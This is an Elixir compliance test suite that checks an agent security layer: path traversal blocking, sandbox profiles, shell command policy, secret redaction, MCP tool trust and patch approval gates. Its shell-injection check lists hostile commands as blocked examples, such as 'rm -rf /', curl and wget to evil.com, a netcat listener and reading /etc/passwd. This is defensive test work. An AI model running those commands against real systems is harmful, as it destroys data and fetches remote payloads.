defmodule Tet.Security.ComplianceSuite do
  @moduledoc """
  Security compliance test suite — BD-0070.

  Runs a battery of compliance checks against the security modules to
  verify fail-closed behavior across every attack dimension. Each check
  returns `{:ok, details}` on pass or `{:error, failures}` on failure.

  ## Compliance checks

    1. **Path traversal prevention** — `../` and encoding attacks are blocked.
    2. **Sandbox boundary enforcement** — workspace-only constraints hold.
    3. **Shell command injection prevention** — unknown/dangerous commands denied.
    4. **Secret redaction completeness** — all known secret patterns are caught.
    5. **MCP trust boundary validation** — classification and permission gates work.
    6. **Remote credential scoping** — trust boundaries and env policies hold.
    7. **Redacted-region patch rejection** — patches touching secrets are gated.

  Pure functions, no processes, no side effects.
  """

  alias Tet.Security.PathFuzzer
  alias Tet.Security.SecretFuzzer
  alias Tet.SecurityPolicy
  alias Tet.SecurityPolicy.Evaluator
  alias Tet.SecurityPolicy.Profile
  alias Tet.ShellPolicy
  alias Tet.Redactor
  alias Tet.Redactor.Inbound
  alias Tet.Secrets
  alias Tet.Mcp.Classification
  alias Tet.Mcp.PermissionGate
  alias Tet.Mcp.CallPolicy
  alias Tet.Remote.TrustBoundary
  alias Tet.Remote.EnvPolicy
  alias Tet.Repair.PatchWorkflow
  alias Tet.Repair.PatchWorkflow.Gate, as: PatchGate

  @type check_name :: atom()
  @type check_result :: {:ok, map()} | {:error, map()}
  @type check_spec :: %{name: check_name(), description: String.t(), run: (-> check_result())}

  # --- Public API ---

  @doc "Returns all compliance check specifications."
  @spec checks() :: [check_spec()]
  def checks do
    [
      %{
        name: :path_traversal_prevention,
        description:
          "Verifies path traversal attacks (../, encoding tricks, null bytes) are blocked",
        run: &check_path_traversal/0
      },
      %{
        name: :sandbox_boundary_enforcement,
        description:
          "Verifies sandbox profiles correctly constrain filesystem and network access",
        run: &check_sandbox_boundary/0
      },
      %{
        name: :shell_command_injection_prevention,
        description: "Verifies shell policy blocks unknown executables and dangerous commands",
        run: &check_shell_injection/0
      },
      %{
        name: :secret_redaction_completeness,
        description: "Verifies all known secret patterns are detected and redacted",
        run: &check_secret_redaction/0
      },
      %{
        name: :mcp_trust_boundary_validation,
        description: "Verifies MCP classification and permission gates enforce trust boundaries",
        run: &check_mcp_trust/0
      },
      %{
        name: :remote_credential_scoping,
        description:
          "Verifies remote trust boundaries and env policies prevent credential leakage",
        run: &check_remote_credential_scoping/0
      },
      %{
        name: :redacted_region_patch_rejection,
        description:
          "Verifies patches involving secrets require approval and are not auto-applied",
        run: &check_redacted_region_patch/0
      }
    ]
  end

  @doc "Runs all compliance checks and returns results."
  @spec run_all() :: %{check_name() => check_result()}
  def run_all do
    checks()
    |> Enum.map(fn %{name: name, run: run_fn} ->
      {name, run_fn.()}
    end)
    |> Map.new()
  end

  @doc "Runs a specific compliance check by name."
  @spec run(check_name()) :: check_result() | {:error, :unknown_check}
  def run(name) when is_atom(name) do
    case Enum.find(checks(), &(&1.name == name)) do
      %{run: run_fn} -> run_fn.()
      nil -> {:error, :unknown_check}
    end
  end

  @doc "Generates a compliance report from results."
  @spec report(%{check_name() => check_result()}) :: map()
  def report(results) when is_map(results) do
    total = map_size(results)
    passed = count_passed(results)
    failed = total - passed

    %{
      total: total,
      passed: passed,
      failed: failed,
      compliant: failed == 0,
      checks:
        Map.new(results, fn {name, result} ->
          {name, format_result(result)}
        end)
    }
  end

  # --- Check implementations ---

  defp check_path_traversal do
    workspace = "/workspace"

    profile =
      Profile.new!(%{
        approval_mode: :auto_approve,
        sandbox_profile: :workspace_only,
        allow_paths: ["#{workspace}/**"],
        deny_globs: []
      })

    attacks = PathFuzzer.generate_traversal_attempts()

    failures =
      attacks
      |> Enum.filter(fn attack ->
        context = %{path: attack, workspace_root: workspace}
        sandbox_result = Evaluator.check_sandbox(:read, context, profile)

        case sandbox_result do
          {:denied, _} ->
            # Sandbox correctly blocked — not a failure
            false

          :allowed ->
            # Sandbox allowed it — verify the resolved path actually escapes.
            # Some attacks (e.g. newline in segment) canonicalise to a path
            # under workspace, which is correct containment, NOT an escape.
            resolved = resolve_path(attack, workspace)
            not path_under_workspace?(resolved, workspace)
        end
      end)
      |> Enum.map(fn attack -> %{attack: attack, reason: :escaped_containment} end)

    build_result(:path_traversal, failures, %{total_attacks: length(attacks)})
  end

  # Lexically resolve a path against a workspace root without touching the filesystem.
  # Handles absolute paths, relative paths, and ../ segments.
  defp resolve_path(path, workspace) do
    normalised = String.replace(path, "\\", "/")

    if String.starts_with?(normalised, "/") do
      canonicalise_segments(normalised, true)
    else
      full = workspace <> "/" <> normalised
      canonicalise_segments(full, true)
    end
  end

  defp canonicalise_segments(path, absolute?) do
    segments = String.split(path, "/")

    resolved =
      Enum.reduce(segments, [], fn
        "", acc -> acc
        ".", acc -> acc
        "..", [] when absolute? -> []
        "..", [] -> [".."]
        "..", [".." | _] = acc when not absolute? -> [".." | acc]
        "..", [_ | rest] -> rest
        segment, acc -> [segment | acc]
      end)
      |> Enum.reverse()
      |> Enum.join("/")

    if absolute? and resolved == "",
      do: "/",
      else: if(absolute?, do: "/" <> resolved, else: resolved)
  end

  defp path_under_workspace?(resolved, workspace) do
    resolved == workspace or String.starts_with?(resolved, workspace <> "/")
  end

  defp check_sandbox_boundary do
    workspace = "/workspace"

    tests = [
      {:locked_down_read,
       fn ->
         locked = Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :locked_down})

         Evaluator.check_sandbox(:read, %{workspace_root: workspace}, locked) ==
           {:denied, :sandbox_locked_down}
       end},
      {:read_only_write,
       fn ->
         read_only = Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :read_only})

         Evaluator.check_sandbox(
           :write,
           %{workspace_root: workspace, path: "#{workspace}/f.ex"},
           read_only
         ) == {:denied, :sandbox_read_only}
       end},
      {:no_network_network_action,
       fn ->
         no_net = Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :no_network})

         Evaluator.check_sandbox(:network, %{workspace_root: workspace}, no_net) ==
           {:denied, :sandbox_no_network}
       end},
      {:workspace_only_external_path,
       fn ->
         ws_only = Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :workspace_only})

         Evaluator.check_sandbox(
           :read,
           %{path: "/etc/passwd", workspace_root: workspace},
           ws_only
         ) == {:denied, :sandbox_workspace_only}
       end},
      {:unrestricted_allows,
       fn ->
         unrestricted =
           Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :unrestricted})

         Evaluator.check_sandbox(
           :read,
           %{path: "/etc/passwd", workspace_root: workspace},
           unrestricted
         ) == :allowed
       end}
    ]

    failures = run_assertions(tests)
    build_result(:sandbox_boundary, failures, %{profiles_tested: length(tests)})
  end

  defp check_shell_injection do
    blocked_commands = [
      {["rm", "-rf", "/"], :unknown_executable},
      {["curl", "http://evil.com"], :unknown_executable},
      {["bash", "-c", "whoami"], :unknown_executable},
      {["python3", "-c", "import os"], :unknown_executable},
      {["sh", "-c", "cat /etc/passwd"], :unknown_executable},
      {["chmod", "777", "/tmp"], :unknown_executable},
      {["sudo", "rm", "-rf", "/"], :unknown_executable},
      {["nc", "-l", "4444"], :unknown_executable},
      {["wget", "http://evil.com/payload"], :unknown_executable},
      # ShellPolicy rejects [""] as unknown_executable (empty-string executable), not empty_vector
      {[""], :unknown_executable},
      {[], :empty_vector}
    ]

    allowed_commands = [
      ["git", "status"],
      ["git", "log"],
      ["mix", "test"],
      ["mix", "compile"],
      ["mix", "format"]
    ]

    # Verify blocked commands are rejected
    block_failures =
      blocked_commands
      |> Enum.reject(fn {cmd, expected_reason} ->
        case ShellPolicy.check_command(cmd) do
          {:error, {_, ^expected_reason}} -> true
          {:error, _other} -> false
          {:ok, _risk} -> false
        end
      end)
      |> Enum.map(fn {cmd, expected} ->
        case ShellPolicy.check_command(cmd) do
          {:ok, risk} ->
            %{command: cmd, risk: risk, reason: :should_have_been_blocked, expected: expected}

          {:error, other} ->
            %{command: cmd, expected: expected, got: other, reason: :unexpected_rejection}
        end
      end)

    # Verify allowed commands are permitted
    allow_failures =
      allowed_commands
      |> Enum.reject(fn cmd ->
        match?({:ok, _}, ShellPolicy.check_command(cmd))
      end)
      |> Enum.map(fn cmd ->
        {:error, reason} = ShellPolicy.check_command(cmd)
        %{command: cmd, reason: reason, expected: :allowed, got: :blocked}
      end)

    failures = block_failures ++ allow_failures

    build_result(:shell_injection, failures, %{
      blocked_tested: length(blocked_commands),
      allowed_tested: length(allowed_commands)
    })
  end

  defp check_secret_redaction do
    secret_variations = SecretFuzzer.generate_secret_variations()

    # Test 1: All secret variations must be detected
    detection_failures =
      secret_variations
      |> Enum.reject(fn {value, _expected_type} -> Secrets.contains_secret?(value) end)
      |> Enum.map(fn {value, expected_type} ->
        %{value_preview: preview(value), expected_type: expected_type, reason: :not_detected}
      end)

    # Test 2: All secret variations must be redacted by Inbound
    redaction_failures =
      secret_variations
      |> Enum.filter(fn {value, _expected_type} ->
        redacted = Inbound.redact_for_provider(%{content: value})
        String.contains?(redacted.content, value)
      end)
      |> Enum.map(fn {value, expected_type} ->
        %{value_preview: preview(value), expected_type: expected_type, reason: :not_redacted}
      end)

    # Test 3: Non-secret values must NOT be falsely detected
    clean_values = ["hello world", "the weather is nice", "user@example.com", "version 1.0.0"]

    false_positive_failures =
      clean_values
      |> Enum.filter(&Secrets.contains_secret?/1)
      |> Enum.map(fn value -> %{value: value, reason: :false_positive} end)

    # Test 4: Sensitive keys must trigger redaction
    sensitive_keys = [:api_key, :password, :secret_token, :authorization, "credential"]

    key_failures =
      sensitive_keys
      |> Enum.reject(&Redactor.sensitive_key?/1)
      |> Enum.map(fn key -> %{key: key, reason: :key_not_detected} end)

    all_failures =
      detection_failures ++ redaction_failures ++ false_positive_failures ++ key_failures

    build_result(:secret_redaction, all_failures, %{
      secrets_tested: length(secret_variations),
      clean_tested: length(clean_values),
      keys_tested: length(sensitive_keys)
    })
  end

  defp check_mcp_trust do
    tests = [
      {:self_downgrade,
       fn ->
         Classification.classify(%{name: "run_bash", mcp_category: :read}) == :shell
       end},
      {:unknown_default,
       fn ->
         Classification.classify(%{name: "xyzzy_unknown"}) == :write
       end},
      {:shell_never_safe,
       fn ->
         for task <- [:researching, :planning, :acting, :verifying, :debugging] do
           not PermissionGate.safe_for_task?(:shell, %{task_category: task})
         end
         |> Enum.all?()
       end},
      {:admin_never_safe,
       fn ->
         for task <- [:researching, :planning, :acting, :verifying, :debugging] do
           not PermissionGate.safe_for_task?(:admin, %{task_category: task})
         end
         |> Enum.all?()
       end},
      {:blocked_categories_denied,
       fn ->
         blocked_policy = CallPolicy.new!(%{blocked_categories: [:shell, :admin, :network]})
         ctx = %{task_category: :acting}

         for cat <- [:shell, :admin, :network] do
           match?({:ok, :deny}, PermissionGate.check(cat, ctx, blocked_policy))
         end
         |> Enum.all?()
       end},
      {:network_only_safe_in_acting,
       fn ->
         for task <- [:researching, :verifying, :debugging, :planning] do
           not PermissionGate.safe_for_task?(:network, %{task_category: task})
         end
         |> Enum.all?()
       end}
    ]

    failures = run_assertions(tests)
    build_result(:mcp_trust, failures, %{tests_run: length(tests)})
  end

  defp check_remote_credential_scoping do
    tests = [
      {:untrusted_sees_nothing,
       fn ->
         secret_scope = %{ref: "db-password", min_trust: :trusted_remote}

         match?(
           {:error, {:secret_access_denied, :untrusted_remote_no_secrets}},
           TrustBoundary.check_secret_access(:untrusted_remote, secret_scope)
         )
       end},
      {:untrusted_ops_denied,
       fn ->
         for op <- TrustBoundary.trusted_remote_operations() do
           match?(
             {:error, {:trust_violation, _}},
             TrustBoundary.check_operation(:untrusted_remote, op)
           )
         end
         |> Enum.all?()
       end},
      {:env_rejects_secret_names,
       fn ->
         for name <- ["AWS_SECRET_ACCESS_KEY", "DATABASE_PASSWORD", "API_TOKEN", "PRIVATE_KEY"] do
           match?({:error, {:secret_name, ^name}}, EnvPolicy.validate_allowlist([name]))
         end
         |> Enum.all?()
       end},
      {:env_filter_drops_secret_keys,
       fn ->
         env = %{"AWS_SECRET_ACCESS_KEY" => "super-secret", "PATH" => "/usr/bin"}
         {:ok, allowlist} = EnvPolicy.validate_allowlist(["HOME", "PATH"])
         filtered = EnvPolicy.filter_env(env, allowlist)
         not Map.has_key?(filtered, "AWS_SECRET_ACCESS_KEY")
       end},
      {:trusted_remote_accesses_scoped_secrets,
       fn ->
         trusted_scope = %{ref: "deploy-key", min_trust: :trusted_remote}
         TrustBoundary.check_secret_access(:trusted_remote, trusted_scope) == :ok
       end},
      {:trusted_remote_denied_local_secrets,
       fn ->
         local_scope = %{ref: "root-key", min_trust: :local}

         match?(
           {:error, {:secret_access_denied, _}},
           TrustBoundary.check_secret_access(:trusted_remote, local_scope)
         )
       end}
    ]

    failures = run_assertions(tests)
    build_result(:remote_credential, failures, %{tests_run: length(tests)})
  end

  defp check_redacted_region_patch do
    tests = [
      {:patch_always_deny,
       fn ->
         locked = Profile.new!(%{approval_mode: :always_deny, sandbox_profile: :locked_down})
         match?({:denied, _}, SecurityPolicy.check(:patch, %{repair_strategy: :patch}, locked))
       end},
      {:patch_needs_approval,
       fn ->
         default = Profile.default()

         match?(
           {:needs_approval, _},
           SecurityPolicy.check(:patch, %{repair_strategy: :patch}, default)
         )
       end},
      {:human_always_deny,
       fn ->
         default = Profile.default()
         match?({:denied, _}, SecurityPolicy.check(:repair, %{repair_strategy: :human}, default))
       end},
      {:sandbox_read_only_blocks_patch,
       fn ->
         read_only = Profile.new!(%{approval_mode: :auto_approve, sandbox_profile: :read_only})

         Evaluator.check_sandbox(
           :patch,
           %{path: "/workspace/file.ex", workspace_root: "/workspace"},
           read_only
         ) == {:denied, :sandbox_read_only}
       end},
      {:deny_glob_blocks_patch,
       fn ->
         deny_profile =
           Profile.new!(%{
             approval_mode: :auto_approve,
             sandbox_profile: :workspace_only,
             deny_globs: ["**/secrets/**"],
             allow_paths: ["**"]
           })

         match?(
           {:denied, :denied_by_glob},
           SecurityPolicy.check(
             :patch,
             %{path: "/workspace/secrets/credentials.yml", workspace_root: "/workspace"},
             deny_profile
           )
         )
       end},
      {:unapproved_workflow_cannot_patch,
       fn ->
         plan = %{description: "test", files: [], changes: []}

         pending_wf = %PatchWorkflow{
           id: "wf-1",
           repair_id: "rep-1",
           plan: plan,
           status: :pending_approval,
           checkpoint_id: nil,
           approval_id: nil
         }

         not PatchGate.can_patch?(pending_wf)
       end}
    ]

    failures = run_assertions(tests)
    build_result(:redacted_region_patch, failures, %{tests_run: length(tests)})
  end

  # --- Helpers ---

  defp run_assertions(tests) do
    tests
    |> Enum.flat_map(fn {name, assertion_fn} ->
      if assertion_fn.() do
        []
      else
        [%{test: name, reason: :assertion_failed}]
      end
    end)
  end

  defp build_result(check_name, [], metadata) do
    {:ok, Map.merge(metadata, %{check: check_name, passed: true, failure_count: 0})}
  end

  defp build_result(check_name, failures, metadata) do
    {:error,
     Map.merge(metadata, %{
       check: check_name,
       passed: false,
       failure_count: length(failures),
       failures: failures
     })}
  end

  defp count_passed(results) do
    Enum.count(results, fn
      {_, {:ok, _}} -> true
      _ -> false
    end)
  end

  defp format_result({:ok, meta}), do: %{status: :passed, details: meta}
  defp format_result({:error, meta}), do: %{status: :failed, details: meta}

  defp preview(value) when is_binary(value) do
    if String.length(value) > 40 do
      String.slice(value, 0, 37) <> "..."
    else
      value
    end
  end

  defp preview(value), do: inspect(value)
end
